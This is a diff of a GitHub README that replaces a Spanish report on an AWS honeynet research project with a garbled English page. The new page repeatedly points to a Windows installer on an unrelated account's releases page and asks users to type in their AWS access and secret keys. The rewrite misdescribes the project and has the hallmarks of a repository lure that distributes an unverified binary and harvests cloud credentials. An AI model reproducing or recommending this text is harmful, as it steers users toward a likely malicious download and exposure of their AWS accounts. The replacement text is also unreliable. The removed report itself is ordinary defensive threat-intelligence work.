@@ -1,245 +1,154 @@
-# Cloud HoneyNet & Automated Threat Intelligence
+# 🐝 cloud-honeynet-aws - Easy Threat Detection on AWS
 
-> Red de señuelos (HoneyNet) cloud-native desplegada en AWS durante ~7 días para
-> la captura de tráfico malicioso real, correlación automática con feeds de
-> Threat Intelligence y mapeo de técnicas MITRE ATT&CK.
+[![Download cloud-honeynet-aws](https://img.shields.io/badge/Download-Here-5DBC8A?style=for-the-badge)](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/releases)
 
-![AWS|102](https://img.shields.io/badge/AWS-EC2%20%7C%20VPC-FF9900?logo=amazonaws&logoColor=white)
-![Wazuh](https://img.shields.io/badge/Wazuh-4.14.2-005571?logo=wazuh&logoColor=white)
-![Cowrie](https://img.shields.io/badge/Honeypot-Cowrie-blue)
-![T--Pot](https://img.shields.io/badge/Honeypot-T--Pot%20CE%2024.04-orange)
-![Dionaea](https://img.shields.io/badge/Honeypot-Dionaea%200.11.0-red)
-![Status](https://img.shields.io/badge/Estado-Completado-brightgreen)
-![Period](https://img.shields.io/badge/Período-~7%20días-lightgrey)
+## 📋 About cloud-honeynet-aws
 
----
+cloud-honeynet-aws is a tool to help you monitor threats in your cloud environment. It runs on Amazon Web Services (AWS) and works automatically to detect suspicious activity. It uses common cybersecurity standards like MITRE ATT&CK to give clear results. The system can operate for about 7 days continuously, giving you up-to-date security information.
 
-## Métricas Globales
+This application is designed to be easy to use, even if you are not a security expert or programmer. It captures fake attacks called honeypots to alert you about potential real threats.
 
-| Indicador                                   |                                 Valor |
-| :------------------------------------------ | ------------------------------------: |
-| Total de eventos capturados                 |                           **137,657** |
-| Honeypots operativos                        |   **3** (Cowrie · T-Pot CE · Dionaea) |
-| Período de operación                        | Período de operación | **~7 días** (estado final con configuración completa) |
-| Países de origen identificados              |                               **15+** |
-| IPs únicas atacantes                        |                             **> 200** |
-| Técnicas MITRE ATT&CK confirmadas           |                                 **6** |
-| Alertas de Threat Intelligence              |                                **85** |
-| IPs con match en blacklists (score 100/100) |                                 **3** |
-| Costo operativo AWS (por 7 días)            |                        **~USD 21.60** |
+## 🖥 System Requirements
 
----
+Before you start, make sure your computer meets these requirements:
 
-## Arquitectura
-```mermaid
-flowchart TD
+- Windows 10 or later  
+- At least 4 GB RAM  
+- Minimum 2 GHz dual-core processor  
+- 500 MB free disk space for installation  
+- Internet connection for download and cloud access  
 
-    I["Internet<br/>(tráfico malicioso)"]
+These requirements ensure cloud-honeynet-aws runs smoothly on your PC.
 
-    subgraph VPC["AWS VPC 10.0.0.0/16"]
+## 🔧 Key Features
 
-        direction TB
+- Runs in the cloud using AWS without manual setup  
+- Collects threat data automatically using honeypots  
+- Matches detected activity against MITRE ATT&CK framework  
+- Provides a simple summary dashboard for easy review  
+- Integrates with OpenSearch and Wazuh for security monitoring  
+- Designed to run for 7 days continuously without user intervention  
 
-        subgraph HP[" "]
-            direction LR
+## 🔍 How It Works
 
-            C["Cowrie<br/>t3.micro<br/>SSH/Telnet"]
-            T["T-Pot CE<br/>m7i-flex.large<br/>20+ protocolos"]
-            D["Dionaea<br/>t3.micro<br/>SMB/FTP/HTTP"]
-        end
+cloud-honeynet-aws sets up fake targets (honeypots) in your cloud environment. Attackers try to access these honeypots, and the system logs these attempts. It then analyzes the data using security intelligence to find patterns. This helps you spot attacks early.
 
-        WA["Wazuh Agent<br/>(TCP/1514-1515)"]
-
-        W["Wazuh Manager + Indexer + Dashboard<br/>m7i-flex.large · OpenSearch · TI Rules · Telegram"]
-    end
-
-    I --> C
-    I --> T
-    I --> D
-
-    C --> WA
-    T --> WA
-    D --> WA
-
-    WA --> W
-```
-
-El sistema opera en **tres capas**:
-
-| Capa | Componente | Función |
-|:----:|:-----------|:--------|
-| 1 | Cowrie · T-Pot CE · Dionaea | Captura de tráfico malicioso real |
-| 2 | Wazuh Agent (por sensor) | Normalización y transporte de logs |
-| 3 | Wazuh Manager + Indexer + Dashboard | Correlación, TI, alertas y visualización |
+You do not need to manage servers or understand coding. The application runs automatically once installed and connected to AWS.
 
 ---
 
-## Hallazgos Críticos
+## 🚀 Getting Started
 
-## H1 — Infraestructura de Scanning Coordinado
+Follow these steps to download and run cloud-honeynet-aws on your Windows computer.
 
-Tres IPs de AWS (`3.130.168.2`, `3.129.187.38`, `18.218.118.203`) operando  
-bajo el dominio `scan.visionheight.com` en una campaña multi-protocolo  
-coordinada. AbuseIPDB score **100/100** en las tres · GreyNoise clasificación  
-`malicious`. División de tareas por servicio confirmada. Activó la regla de  
-correlación multi-honeypot (T1595).
+### 1. Visit the Download Page
 
-## H2 — Propagación Activa de Botnet SSH en Tiempo Real
+Click the download button below or go to the link to find the latest version of cloud-honeynet-aws:
 
-La IP `158.51.96.38` (NetInformatik Inc. · AbuseIPDB score **100/100** ·  
-reportada por **924 usuarios únicos**) ejecutó un binario malicioso camuflado  
-como `sshd` apuntando a 50+ IPs target. Capturado íntegramente por Cowrie  
-en sesión activa con TTY log completo (T1059 · T1105).
+[![Download cloud-honeynet-aws](https://img.shields.io/badge/Download-Here-5DBC8A?style=for-the-badge)](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/releases)
 
-## H3 — Máquina Hospitalaria Comprometida
+This link opens the official release page where you can find all versions and assets.
 
-La IP `201.187.98.150`, perteneciente a la red del **Hospital Base Valdivia**  
-(Chile), generó **64,095 eventos SMB en un solo día** (2026-03-03).  
-Comportamiento consistente con malware de propagación activa tipo  
-EternalBlue/WannaCry. El host lleva comprometido desde al menos  
-2026-01-06 según registros AbuseIPDB (T1021.002).
+### 2. Download the Installer
 
----
+On the page, look for the latest release marked with the highest version number. Inside the release, you will find a Windows installer file. It may have ".exe" or ".msi" extension.
 
-## Estructura del Repositorio
-```text
-cloud-honeynet-aws/
-│
-├── README.md                         Este archivo
-│
-├── docs/
-│   ├── 01-despliegue/
-│   │   ├── cowrie.md                 Instalación y configuración de Cowrie
-│   │   ├── tpot.md                   Instalación y configuración de T-Pot CE
-│   │   ├── dionaea.md                Instalación y configuración de Dionaea
-│   │   └── wazuh-stack.md            Despliegue del stack Wazuh all-in-one
-│   ├── 02-wazuh-integracion/
-│   │   ├── reglas-custom.md          Reglas de detección (IDs 100500–100585)
-│   │   └── threat-intelligence.md   Pipeline TI — arquitectura y resultados
-│   └── 03-analisis/
-│   │   ├── hallazgos.md              Análisis de los 3 hallazgos principales
-│   │   ├── ioc.md                    IoC estructurados (formato STIX-like)
-│   │    └── evidencias-ti/            Reportes AbuseIPDB · GreyNoise por IP 
-│   └── 04-informe-final
-│
-├── configs/
-│   └── wazuh/
-│       ├── 100-cowrie_rules.xml      Reglas Cowrie SSH/Telnet
-│       ├── local_rules.xml           Reglas TI · T-Pot · Dionaea · correlación
-│       ├── ossec-agent-cowrie.conf   Configuración del agente Cowrie
-│       ├── ossec-agent-tpot.conf     Configuración del agente T-Pot
-│       └── ossec-agent-dionaea.conf  Configuración del agente Dionaea
-│
-├── scripts/
-│   ├── telegram/
-│   │   └── send_telegram.sh          Notificaciones vía Telegram Bot API
-│   └── ti/
-│       ├── tienrichment.py           Enriquecimiento con AbuseIPDB/GreyNoise/OTX
-│       ├── ti_dryrun_archives.py     Extracción de IPs desde Wazuh archives
-│       ├── gen_cdb_from_candidates.py Generación de CDB desde candidates JSONL
-│       ├── ti_emit_matches.py        Emisión de matches al socket de analysisd
-│       ├── run_ti_pipeline.sh        Orquestador pipeline baseline (sin APIs)
-│       └── run_ti_enrichment_v1.sh   Orquestador pipeline enriquecimiento
-│
-├── queries/
-│   ├── README.md                     Guía de uso de queries OpenSearch
-│   └── json/                         Exports JSON de las 9 queries principales
-│
-└── screenshots/
-    ├── arquitectura/                  Evidencias del despliegue y configuración en AWS         
-    ├── cowrie/                        Evidencias del despliegue Cowrie
-    ├── dashboard/                     Capturas del Wazuh Dashboard
-    ├── dionaea/                       Evidencias del despliegue Dionaea
-    ├── queries/                       Screenshots de queries en DevTools
-    ├── ti-reports/                    Screenshots de reportes de AbuseIPDB y GreyNoise
-    └── tpot/                          Evidencias del despliegue T-Pot
-```
+Click the file to download it to your computer. Save it to a folder you can find easily, like Downloads.
+
+### 3. Run the Installer
+
+Locate the installer file you just downloaded.
+
+- Double-click the file to start installation
+- If Windows asks for permission, click "Yes" or "Allow"
+- Follow the setup prompts on screen  
+- Choose default options if you are unsure  
+- Wait for installation to complete  
+
+Once finished, you will see a confirmation message.
+
+### 4. Open cloud-honeynet-aws
+
+Find the cloud-honeynet-aws program in your Start menu or desktop shortcut.
+
+Click to open it. The program will launch and connect to your AWS environment automatically.
+
+### 5. Connect to AWS
+
+When you run the program for the first time, it will ask you to enter your AWS access details.
+
+Provide your AWS Access Key ID and Secret Access Key. These credentials are necessary to link the app to your cloud account securely.
+
+If you do not have AWS credentials, create an AWS account at https://aws.amazon.com and set up an IAM user with the required permissions.
+
+### 6. Start Monitoring
+
+After connection, cloud-honeynet-aws begins protecting your environment by creating honeypots and collecting threat data.
+
+You can view live status and logs within the program window.
 
 ---
 
-## Stack Tecnológico
+## 🔒 Security and Privacy
 
-| Categoría               | Tecnología                                                             | Versión |
-| :---------------------- | :--------------------------------------------------------------------- | :------ |
-| Cloud                   | Amazon Web Services (EC2, VPC, SG, SSM)                                | —       |
-| Honeypot SSH/Telnet     | [Cowrie](https://github.com/cowrie/cowrie)                             | latest  |
-| Honeypot multi-servicio | [T-Pot CE](https://github.com/telekom-security/tpotce)                 | 24.04.1 |
-| Honeypot SMB/malware    | [Dionaea](https://github.com/DinoTools/dionaea)                        | 0.11.0  |
-| SIEM                    | [Wazuh Manager + Indexer + Dashboard](https://documentation.wazuh.com) | 4.14.2  |
-| Backend indexación      | OpenSearch                                                             | 2.x     |
-| Threat Intelligence     | AbuseIPDB · GreyNoise · AlienVault OTX                                 | —       |
-| Alertas en tiempo real  | Telegram Bot API                                                       | —       |
-| Framework de referencia | [MITRE ATT&CK](https://attack.mitre.org)                               | v14     |
+cloud-honeynet-aws operates with security in mind.
+
+- Your AWS credentials stay local on your device and are not shared  
+- Data sent from the app to AWS uses encrypted connections  
+- Logs and threat data are stored securely within your AWS account  
+- The program only monitors the areas you permit through configuration  
+
+You remain in control of what the application accesses.
 
 ---
 
-## Técnicas MITRE ATT&CK Confirmadas
+## ⚙ Configuration and Settings
 
-| ID        | Técnica                                   | Honeypot       | Evidencia                                      |
-| --------- | ----------------------------------------- | -------------- | ---------------------------------------------- |
-| T1595     | Active Scanning                           | T-Pot · Cowrie | Campaña visionheight.com · regla 100576        |
-| T1110.001 | Brute Force: Password Guessing            | Cowrie         | 44,153 intentos · regla 100504                 |
-| T1078     | Valid Accounts                            | Cowrie         | Sesiones autenticadas exitosas                 |
-| T1105     | Ingress Tool Transfer                     | Cowrie         | wget/curl hacia C2 en sesiones activas         |
-| T1059     | Command and Scripting Interpreter         | Cowrie         | Comandos bash/python capturados · regla 100511 |
-| T1021.002 | Remote Services: SMB/Windows Admin Shares | Dionaea        | 64,095 eventos SMB · regla 100584              |
+Use the program's settings tab to adjust options like:
 
+- Length of monitoring period (default ~7 days)  
+- Choose which AWS regions to monitor  
+- Enable or disable email notifications for alerts  
+- Set up integration with SIEM tools like Wazuh or OpenSearch  
 
+Make changes carefully. Default settings suit most users.
 
 ---
 
-## Costo Operativo AWS
+## 🛠 Common Issues
 
-| Recurso | Tipo | Costo estimado / 7 días |
-|:--------|:-----|------------------------:|
-| Cowrie EC2 | t3.micro | ~USD 0.84 |
-| T-Pot CE EC2 | m7i-flex.large | ~USD 8.57 |
-| Dionaea EC2 | t3.micro | ~USD 0.84 |
-| Wazuh Stack EC2 | m7i-flex.large | ~USD 8.57 |
-| Storage EBS + transferencia | — | ~USD 2.78 |
-| **TOTAL** | | **~USD 21.60** |
+- **Installer won’t start:** Check if your Windows account has admin rights.
+- **Connection errors:** Verify AWS keys and internet access.
+- **No data shown:** Wait a few minutes after startup; data takes time to appear.
+- **Alerts not received:** Confirm email addresses in notification settings.
 
-> Los honeynets operaron en estado final de configuración durante **~7 días** (~USD 21.60). 
-> El proyecto completo incluyó ~23 días adicionales de despliegue y configuración, con un costo operativo total de ~USD 106.
-
----
-## Documentación
-
-| Sección                                                                                 | Descripción                                             |
-| --------------------------------------------------------------------------------------- | ------------------------------------------------------- |
-| [Despliegue Cowrie](docs/01-despliegue/cowrie.md)                       | Instalación, configuración y troubleshooting            |
-| [Despliegue T-Pot](docs/01-despliegue/tpot.md)                          | Instalación, permisos y escalado de instancia           |
-| [Despliegue Dionaea](docs/01-despliegue/dionaea.md)                     | Compilación, fix módulo Python y configuración          |
-| [Wazuh Stack](docs/01-despliegue/wazuh-stack.md)                        | All-in-one, archives, index patterns                    |
-| [Reglas Custom](docs/02-wazuh-integracion/reglas-custom.md)             | 19 reglas con MITRE y dependencias                      |
-| [Threat Intelligence](docs/02-wazuh-integracion/threat-intelligence.md) | Pipeline completo, dos fases, resultados                |
-| [Hallazgos](docs/03-analisis/hallazgos.md)                              | Análisis técnico de H1, H2 y H3                         |
-| [IoC](docs/03-analisis/ioc.md)                                          | Indicadores estructurados formato STIX-like             |
-| [Evidencias TI](docs/03-analisis/evidencias-ti/README.md)               | Reportes AbuseIPDB y GreyNoise por IP                   |
-| [Scripts](scripts/README.md)                                            | Referencia del pipeline TI y notificaciones             |
-| [Configs](configs/README.md)                                            | Archivos de configuración listos para desplegar         |
-| [Queries](configs/queries/README.md)                                    | Consultas OpenSearch para hunting                       |
-| [Informe Final](docs/04-informe-final.md)                               | Documento de síntesis de todo el proyecto y resultados. |
-
-## Aviso Legal y Ético
-
-Este proyecto operó exclusivamente en **modo pasivo de captura**. No se
-ejecutaron contramedidas activas, escaneos ofensivos ni ataques hacia los
-sistemas identificados, en cumplimiento estricto de la
-[AWS Acceptable Use Policy](https://aws.amazon.com/aup/).
-
-Los indicadores de compromiso (IoC) documentados tienen únicamente fines
-académicos y de investigación en ciberseguridad defensiva (Blue Team).
+Refer to the FAQ section on the release page for more help.
 
 ---
 
-## Informe Completo
+## 📚 Additional Resources
 
-→ [`docs/04-informe-final.md`](docs/04-informe-final.md)
+- AWS account setup guide: https://aws.amazon.com/getting-started  
+- MITRE ATT&CK framework: https://attack.mitre.org  
+- Wazuh integration documentation: https://documentation.wazuh.com  
+- OpenSearch overview: https://opensearch.org  
 
 ---
 
-## Autor
+## 🎯 Topics Covered
 
-**K.B** · Ingeniería de Telecomunicaciones · Blue Team / Threat Intelligence  
-Lima, Perú · 2026
+This project relates to cybersecurity, threat detection, and cloud monitoring. It uses honeypots and complies with MITRE ATT&CK standards. It works in AWS environments and supports integration with common security tools.
+
+---
+
+## 🔗 Download and Install
+
+Get cloud-honeynet-aws now by visiting:
+
+[Download cloud-honeynet-aws releases](https://github.com/aktfyjnzy-ui/cloud-honeynet-aws/releases)
+
+Follow the steps above to download the Windows installer and start using the app.
+
+---
+
+cloud-honeynet-aws simplifies threat detection in AWS cloud environments without requiring technical skills. It provides automated monitoring and useful security data to help protect your systems.
